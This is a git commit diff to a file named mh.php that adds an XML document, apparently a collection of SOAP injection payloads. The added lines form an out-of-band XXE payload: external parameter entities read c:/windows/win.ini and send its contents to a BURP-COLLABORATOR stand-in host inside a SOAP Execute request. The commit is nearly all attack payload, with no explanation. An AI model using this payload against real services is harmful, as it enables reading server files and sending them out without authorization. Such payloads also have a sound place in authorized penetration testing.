3b2375d9f495c7d653d4b501eeb059765d331e82
N-AH1D <hossainnahid703@gmail.com>
2026-01-26 21:57:42 +0600

    Update mh.php

--- mh.php
+++ mh.php
@@ -23,3 +23,20 @@ echo "Done"
     </Execute>
   </soap:Body>
 </soap:Envelope>
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR/?%file;'>">
+%eval;
+%exfil;
+]>
+<soap:Envelope>
+  <soap:Body>
+    <Execute>
+      <strXML>test</strXML>
+    </Execute>
+  </soap:Body>
+</soap:Envelope>
